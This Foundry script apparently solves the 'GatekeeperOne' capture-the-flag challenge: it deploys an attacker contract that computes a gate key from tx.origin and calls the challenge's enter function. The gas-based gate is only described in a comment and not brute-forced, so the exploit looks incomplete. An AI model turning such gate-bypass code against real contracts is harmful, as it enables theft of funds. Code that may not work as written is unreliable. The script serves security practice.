// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import { Script, console } from "forge-std/Script.sol";
import { HelperConfig } from "./HelperConfig.s.sol";
import { GatekeeperOne } from "../src/13_GatekeeperOne.sol";

contract Attacker {

  GatekeeperOne challenge;

  constructor(address challengeInstanceAddress) {
    challenge = GatekeeperOne(challengeInstanceAddress);
  }

  function attack() public {
    // gateOne = send the tx from another contract
    // gateTwo = gasleft() % 8191 == 0
    // gateThree = uint16(uint160(tx.origin)) as a bytes8 (hex) with the first four bits as a 1 instead of 0 to overflow the unint32 and uint16.
    uint16 addressToInt = uint16(uint160(tx.origin));
    bytes8 key = bytes8(uint64(addressToInt + 2**60));
    challenge.enter(key); // must brute force this
  }

}

contract GatekeeperOneAttacker is Script {

  uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

  function run() external {

    HelperConfig helperConfig = new HelperConfig();
    address payable challengeInstanceAddress = payable(helperConfig.instances("GatekeeperOne"));

    vm.startBroadcast(deployerPrivateKey);
    Attacker attacker = new Attacker(challengeInstanceAddress);
    attacker.attack();

    vm.stopBroadcast();
  }

}